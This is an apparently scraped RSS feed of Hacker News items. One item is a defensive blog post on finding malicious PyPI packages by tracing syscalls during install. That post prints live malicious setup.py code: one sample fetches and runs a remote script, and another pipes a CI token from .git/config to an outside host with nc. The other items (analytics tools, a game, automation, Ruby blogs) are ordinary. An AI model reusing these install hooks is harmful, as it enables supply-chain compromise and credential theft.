<img src="https://images.ctfassets.net/hb3id6ag4raq/1dJrVz6iYkXWuBNsENZU7v/4dcef2dc5222491006217897cde49070/Screenshot_2020-11-04_at_21.08.49.png" alt="Simple Analytics 7-days"></p><p>You will see all the important information you need at a glance with a beautiful dashboard. Event tracking is possible but stated as being highly experimental.</p><p>Simple Analytics have a <a target="_blank" rel="noopener noreferrer" href="https://simpleanalytics.com/roadmap">public roadmap</a> too, where you can see what will be implemented next and even request missing features!</p><h2>Splitbee</h2><p><a target="_blank" rel="noopener noreferrer" href="https://splitbee.io/">https://splitbee.io/</a></p><blockquote><p>Your friendly all-in-one analytics &amp; conversion tool.</p></blockquote><p>Splitbee is a bit different than the other analytics SaaS, as it offers additional features too that are not only focusing on analytics.</p><p>Splitbee offers a modern UI where you can see your top pages and top sources in addition to how many unique users you got in that period.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/6upzuNTkklX4ln0KDinmyi/439af49405408544b829de71f3b39827/Screenshot_2020-11-04_at_21.11.01.png" alt="Splitbee 7-days"></p><p>Additional to analytics you can do automation where you can send emails or trigger a webhook when a certain event or pageview happens.</p><p>You can do "experiments" like A/B testing or Redirect testing.</p><p>If you are using Splitbee with your app where users sign in you can identify users so you can track them and see how they interact with your app.</p><p>I haven't used many of the offered features besides page and event tracking. I could add automation where I send myself a message when some successfully sign up for my newsletter, which is neat.</p><h2>Matomo</h2><p><a target="_blank" rel="noopener noreferrer" href="https://matomo.org/">https://matomo.org/</a></p><blockquote><p>Google Analytics alternative that protects your data and your customers' privacy</p></blockquote><p>Matomo is probably the most known alternative to Google Analytics. I have used it for some time, but I am not a big fan of it because it offers way too much functionality for my use case.</p><p>It is probably the most mature alternative to Google Analytics as it offers a great selection of plugins and settings. If you just need to track page views with some events then I think Matomo might not be the best choice.</p><p>Like Plausible Analytics and Umami, you can host Matomo yourself which I think is great!</p><h2>Conclusion</h2><p>You see that there are many great alternatives for Google Analytics out there that focus on privacy and won't sell your data.</p><p>I think there is no need to continue using Google Analytics for simple projects that won't use any other Google Services.</p><p>If you care about privacy you should probably switch to one of the mentioned alternatives.</p><p>Every single product I mentioned offer great features and I can recommend them all. I wish I could use all of them, but that would be counterproductive to bloat a website with all possible trackers 😁</p><p>I think Plausible Analytics is the one that speaks to me the most. I like the UI and the reason that it is open source. They have a great product and offer a good service with their hosted solution which allowed them to <a target="_blank" rel="noopener noreferrer" href="https://www.indiehackers.com/product/plausible-insights/hit-6k-mrr-and-got-featured-in-techcrunch--MKJIZLay_rToE1kxCO8">reach an MRR of over 6K$</a>.</p><p>Do you still use Google Analytics and if so are you thinking about using an alternative? Let me know what you think in the comments I am very interested to hear what you have to share!</p></div></div>]]>
            </description>
            <link>https://phiilu.com/here-are-6-google-analytics-alternatives-that-care-about-your-privacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082460</guid>
            <pubDate>Fri, 13 Nov 2020 14:27:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pico-8: Attack on the Deathstar]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25082311">thread link</a>) | @tosh
<br/>
November 13, 2020 | https://freds72.itch.io/attack-on-the-deathstar | <a href="https://web.archive.org/web/*/https://freds72.itch.io/attack-on-the-deathstar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="inner_column"><div id="view_html_game_page_69741"><div><div><div><h2>Be an X-Wing pilot!</h2>
<p>Take a seat in the most advanced fighter of the galaxy. Fight against the evil empire!
Use proton torpedo to quickly dismiss enemy forces or your 4 blasters (aiming skill required).
Go through 4 epic missions, from space to Deathstar and back.</p>
<h2>Flight Manual</h2>
<figure><img src="https://www.lexaloffle.com/bbs/files/25532/xvst_manual_0.gif" width="256" height="256"></figure>
<p>Objective marker:&nbsp;<img src="https://img.itch.zone/aW1nLzE3MTkyMDEucG5n/original/bv8n3u.png"></p>
<blockquote>Note: the game is *not* mobile friendly - a keyboard or gamepad is required.</blockquote>
<h2>Game Devlog</h2><p>Update: reduced Tie hit points / improved Tie damage</p>
<p><a href="https://www.lexaloffle.com/bbs/?tid=31443" target="_blank" rel="nofollow noopener">Attack on the Deathstar @ PICO-8 BBS</a></p>
<blockquote><br>Copyright Notice<br>Starwars logo/music/... credits to their respective owners. Don't sue me :/</blockquote></div><h2 id="download">Download</h2><div><p>Click download now to get access to the following files:</p></div><section id="devlog"><h2>Development log</h2><ul><li><a href="https://freds72.itch.io/attack-on-the-deathstar/devlog/123534/minor-update">Minor update</a><p><abbr title="07 February 2020 @ 20:44"><span></span> Feb 07, 2020</abbr></p></li><li><a href="https://freds72.itch.io/attack-on-the-deathstar/devlog/60334/standalone-binaries">Standalone binaries</a><p><abbr title="16 December 2018 @ 15:42"><span></span> Dec 16, 2018</abbr></p></li></ul></section></div></div></div></div></div></div>]]>
            </description>
            <link>https://freds72.itch.io/attack-on-the-deathstar</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082311</guid>
            <pubDate>Fri, 13 Nov 2020 14:14:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A complete guide to transform your website into a PWA]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25082058">thread link</a>) | @floXcoder
<br/>
November 13, 2020 | https://www.ginkonote.com/users/flo/articles/transform-your-website-into-a-pwa@javascript | <a href="https://web.archive.org/web/*/https://www.ginkonote.com/users/flo/articles/transform-your-website-into-a-pwa@javascript">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.ginkonote.com/users/flo/articles/transform-your-website-into-a-pwa@javascript</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082058</guid>
            <pubDate>Fri, 13 Nov 2020 13:48:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hunting for Malicious Packages on PyPI]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25081937">thread link</a>) | @mef
<br/>
November 13, 2020 | https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/ | <a href="https://web.archive.org/web/*/https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<article>

<section>
<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
          <span>"name"</span><span>:</span> <span>"gist.githubusercontent.com"</span><span>,</span>
          <span>"addresses"</span><span>:</span> <span>[</span>
            <span>"199.232.64.133"</span>
          <span>]</span>
    <span>}]</span>
  <span>]</span><span>,</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious.py"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious-was-here"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>
<span>with</span> <span>open</span><span>(</span><span>"/tmp/malicious.py"</span><span>,</span> <span>"wb"</span><span>)</span> <span>as</span> <span>fp</span><span>:</span>
    <span>fp</span><span>.</span><span>write</span><span>(</span><span>handler</span><span>.</span><span>read</span><span>())</span>

<span>import</span> <span>subprocess</span>

<span>subprocess</span><span>.</span><span>call</span><span>([</span><span>"python"</span><span>,</span> <span>"/tmp/malicious.py"</span><span>])</span></code></pre></div>
<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>
<span>]</span></code></pre></div>
<p>Suspicious, but not actively harmful. However, this is a <em>perfect</em> example showing the power of tracing syscalls. Here is the relevant code in …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></em></p>]]>
            </description>
            <link>https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081937</guid>
            <pubDate>Fri, 13 Nov 2020 13:33:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Easy automation wins: why do organisations still use paper?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081917">thread link</a>) | @yorkiebar
<br/>
November 13, 2020 | https://netsells.co.uk/insights/easy-automation-wins-your-business-may-be-missing-out-on | <a href="https://web.archive.org/web/*/https://netsells.co.uk/insights/easy-automation-wins-your-business-may-be-missing-out-on">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-2d16bece=""><p><span>Whilst automation isn’t a new concept, it’s poised to have the biggest impact on how businesses operate over the next ten years. From </span><a href="https://www.ship-technology.com/features/ai-in-shipping/"><span>AI-driven shipping and logistics</span></a><span> to </span><a href="https://www.computerweekly.com/news/252473116/Cost-savings-drive-business-automation"><span>fine-tuned cost reduction</span></a><span>, businesses all over the world are leveraging new technologies to streamline their internal processes and outpace the competition.&nbsp;&nbsp;</span></p>
<p><span>Streamlining internal processes allows businesses to reduce costs, maximise output, and enable expensive staff members to focus on judicious tasking. In addition, there are huge benefits in data validity, security and accessibility, as technology-based solutions allow for accurate and instantaneous reporting that can be shared quickly, with the right people.</span></p>
<p><span>However, despite many businesses taking steps to fine-tune their internal systems, many still struggle to identify the internal processes that would benefit most from automation, how to sell the idea to internal stakeholders and how to choose a reputable third party supplier.</span></p>
<p><a href="https://netsells.co.uk/services/digital-transformation"><span>To learn more about the benefits of digital transformation, check out our services page.</span></a></p>
<h2><span>How to Identify Weaknesses in Your Internal Processes</span></h2>
<p><strong>Define the Process and Goals</strong></p>
<p><span>Define the processes that your business uses. Even if it works, automation can save time or increase accuracy to make it better. By mapping your data collection, procedures and usage, you may find that automation can remove the need for certain steps in the process.</span></p>
<p><strong>Watch the Process in Action</strong></p>
<p><span>Ask yourself if you can innovate the process to make it more practical. Are there any steps that can be removed? Speak to the staff responsible for the day-to-day operation of the process to learn about their pain points, ensuring that any changes reflect current business goals.</span></p>
<p><strong>Consider Time</strong></p>
<p><span>Does a process take up too much of your employees’ time? It would be more efficient for your staff to focus their time on the human aspects of their jobs, like decision-making, planning, and providing excellent customer service internally or externally. If any process is repetitive and requires extra staff or time to manage, then automation could save money, time and alleviate your employees’ hardships.</span></p>
<p><strong>Complexity</strong></p>
<p><span>Ask your employees about the difficulty of their processes and the steps. If something is hard to manage, sophisticated and requires many levels, it may be worth automating. However, it’s useful to keep in mind that the harder the process, the more set up might be required. So, make sure that the method you want to automate will provide adequate ROI.</span></p>
<p><strong>Continuity</strong></p>
<p><span>If a process is unstable and changes frequently, it may not be worth automating. However, if a process is the same day in and day out, the repetition can be automated and can help achieve success.</span><strong>&nbsp;</strong></p>
<h2><span>Automating Paper Processes</span></h2>
<p><span>One of the most easily identifiable opportunities for technology-based automation lies in paper processing. Although once the standard, digital document-gathering has increased the creation speed, accuracy and availability of this type of information.&nbsp;</span></p>
<p><span>However, many large-scale businesses continue to use legacy systems, using paper records to track everything from QA records to staff information. These systems can often be automated for an ‘easy win’ in a number of areas:</span></p>
<p><strong>Purchase-To-Orders</strong><span>: Policies about who is allowed to purchase at what level and what approvals that person needs for certain purchases can be automated through paperless workflows: a purchase order is sent to accounting personnel and that order is assigned a number which is then put into the accounting or ERP system. This also allows for discrepancies between POs and invoices to be identified automatically.</span><span><br></span></p>
<p><strong>Employee Onboarding:</strong><span> The HR process is traditionally paper intensive, from tax-related forms to payslips and emergency contact information, at one time, everything was stored and filed on paper. Today, information collected on electronic forms can be automatically delivered to the corresponding departments, saving time and increasing security of personal data.</span><span><br></span></p>
<p><strong>Content Approval:</strong><span> Paper-based processes are usually linear. When an employee is finished reviewing one document, that document goes to the next person in the chain. Remove the linear nature of that document chain, and all responsible parties receive the same document in their inbox at once for faster, more efficient approvals.</span></p>
<p><strong>Compliance &amp; QA:</strong><span> These kinds of documents are often passed between departments with a cover sheet of corresponding signatures. Technology-based solutions ensure documents follow a set process path before moving on to final approval, with immediate availability. This makes the process faster and more robust.</span><span><br></span></p>
<p><strong>Paper-Based Data Entry:</strong><span> In some organisations staff fill out paper forms and physically hand them to team members who keys that person’s responses into an electronic system. Digital processes prevent multiple people from doing the same task, and consolidating those efforts into a single electronic workflow that ultimately saves time and money.</span></p>
<p><em><span>We recently worked with Warburtons to digitally transform their manual quality assurance process. Leveraging automated reporting and rapid mobile app development, we were able to drastically improve internal efficiency. </span></em><a href="https://netsells.co.uk/case-studies/warburtons"><em><span>Read the full case study here</span></em></a><em><span>.</span></em></p>
<h2><span>Does Process Automation Cost Jobs?</span></h2>
<p><span>One of the main concerns when it comes to process automation is whether it is going to cause significant workplace redundancies. In truth, it comes down to the approach you want to adopt as a business.&nbsp;</span></p>
<p><span>Automated technology services drastically improve the efficiency of laborious tasking, with increased accuracy in reporting. As a result of this, there may be less of a need for operational workers in your business, paving the way to a reduced workforce and significantly reduced human resource spending.</span></p>
<p><span>That being said, automation can also be used as a tool to get the best from your staff. By removing the need for laborious processing, teams are able to focus on work that requires a human touch- be it overarching operations, creative production or systems management.</span></p>
<p><span>In fact, it is predicted that almost </span><a href="https://automationfirst.economist.com/smart-automation-with-software-robots/"><span>48% of the working day</span></a><span> is lost due to un-optimised processes.</span><br><span>It is also worth noting that the type of automation you decide to undergo, as well as business size and industry you operate in play affect potential savings in this area. Automation is a bespoke transformation that works on weaknesses in </span><em><span>your</span></em><span> processes, making changes in the areas that matter.</span></p></div></div>]]>
            </description>
            <link>https://netsells.co.uk/insights/easy-automation-wins-your-business-may-be-missing-out-on</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081917</guid>
            <pubDate>Fri, 13 Nov 2020 13:30:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby Blogs to Follow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081862">thread link</a>) | @karlhughes
<br/>
November 13, 2020 | https://draft.dev/learn/technical-blogs/ruby | <a href="https://web.archive.org/web/*/https://draft.dev/learn/technical-blogs/ruby">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
<article>
  <div>
    
    <div>
      <p><img src="https://draft.dev/learn/assets/posts/ruby.png" alt="Background image for The Best Ruby Blogs"></p>
    </div>
    

    <p>
      
      Published in
        
          <a href="https://draft.dev/learn/technical-blogs/">technical-blogs</a>
        
      by
      
       Tola Ore-Aruwaji&nbsp;&nbsp;&nbsp;—&nbsp;
      8 minute read
    </p>

    
      <p><a href="https://www.ruby-lang.org/en/">Ruby</a> is a popular language used for building full-stack and backend web applications. Developers who want to keep up with Ruby’s new features, frameworks, and best practices should make a habit of following some of the best blogs and resources out there.</p>

<p>To help you out, I compiled a list of the best Ruby blogs currently available on the internet. I researched, analyzed, and read articles by several authors on each blog to get an idea of their standards, composition, insight, simplicity, and eloquence. I also looked at feedback from developers to figure out which blogs are the most useful to the community.</p>

<p>Here are the top 22 Ruby blogs and resources I found:</p>

<h3 id="1-ruby-weekly">1. <a href="https://rubyweekly.com/">Ruby Weekly</a></h3>

<p><img src="https://i.imgur.com/JJqJDNn.png" alt="Ruby Weekly Newsletter"></p>

<p>Ruby Weekly is a newsletter that features the latest news and trends on Ruby. Ruby Weekly is very comprehensible and has excellent feedback from the developer community. On the home page, there is a preview of the latest issue to enable you to get an overview of the content. A new issue is published weekly and includes several well-written and well-referenced articles.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 5</li>
  <li>Longevity - 5</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 5.0</strong></p>


      


      
<h3 id="2-the-official-rails-blog">2. <a href="https://weblog.rubyonrails.org/">The Official Rails Blog</a></h3>

<p>For updates about the latest features and detailed knowledge of Ruby on Rails, the official blog is highly recommended. The blog includes everything you need to build Rails applications and keep up with the newest changes to the framework. It has a friendly community, and each article on the blog is written precisely. A section called “This week in Rails” includes effective guidelines and instructions from developers. The style and ideas are simple easy for any reader - beginner or advanced - to understand.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency -4</li>
  <li>Longevity - 5</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.8</strong></p>

<h3 id="3-everyday-rails">3. <a href="https://everydayrails.com/">Everyday Rails</a></h3>

<p>Everyday Rails contains a lot of useful tips, especially if you are just starting out as a Ruby developer. The articles on the blog are practically applicable, and most posts are about getting a better understanding of <em>why</em> the plugins, gems, and other Ruby parts do what they do. The author’s explanation is professional and offers a direct implementation guide.</p>

<p><img src="https://i.imgur.com/aTfr7hI.png" alt="Everyday Rails"></p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 4</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.6</strong></p>

<h3 id="4-rubyflow">4. <a href="http://www.rubyflow.com/">RubyFlow</a></h3>

<p>RubyFlow is a popular Ruby blog that aggregates technical posts from a variety of well-known sources. It includes language updates, tutorial guides, and productivity tips. Content shared on RubyFlow is clearly expressed for newbies and experienced Ruby developers alike.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 4</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.6</strong></p>

<h3 id="5-drifting-ruby">5. <a href="https://www.driftingruby.com/episodes">Drifting Ruby</a></h3>

<p><img src="https://i.imgur.com/PeAgSWn.png" alt="Drifting Ruby Blog"></p>

<p>Drifting Ruby is a compilation of documentation, tutorials, and screencasts for Ruby developers. It provides tutorials for all levels ranging from beginner to expert. Most topics covered are drafted out step-by-step with helpful real-world examples, and you can subscribe on the homepage to get the weekly posts delivered to your inbox. The topics can also be filtered to enable you to find the exact kind of content you are looking for.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 4</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Overall Score: 4.6</strong></p>

<h3 id="6-awesome-ruby">6. <a href="https://ruby.libhunt.com/">Awesome Ruby</a></h3>

<p><img src="https://i.imgur.com/VDFxgtB.png" alt="Awesome Ruby Blog"></p>

<p>Awesome Ruby is a curated list of Ruby resources and packages that can help you with testing, package management, security, authentication, and more. There are a lot of libraries here, and they use tags to help organize all of them.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 5</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 3</li>
</ul>

<p><strong>Overall Score: 4.4</strong></p>

<h3 id="7-arkency-blog">7. <a href="https://blog.arkency.com/">Arkency Blog</a></h3>

